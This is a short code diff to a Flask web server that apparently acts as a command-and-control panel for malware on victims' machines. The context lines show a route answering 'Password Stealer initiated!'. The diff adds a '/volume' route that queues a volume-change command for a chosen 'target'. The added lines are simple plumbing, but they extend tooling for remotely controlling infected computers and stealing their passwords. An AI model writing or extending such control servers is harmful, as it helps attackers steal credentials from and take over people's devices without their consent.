@@ -184,6 +184,21 @@ def passwords():
 
     return "Password Stealer initiated!"
 
+@app.route("/volume", methods=["GET"])
+def volume():
+    target = request.args.get("target", default="1", type=str)
+    percent = request.args.get("percent", default="5", type=str)
+
+    data = get_user_data()
+    data2 = data[target]
+    commands = data2["commands"]
+
+    commands["volume"] = percent
+
+    writefile(data)
+
+    return "Volume Changer initiated!"
+
 
 if __name__ == "__main__":
     app.run("0.0.0.0", 8080, debug=True)
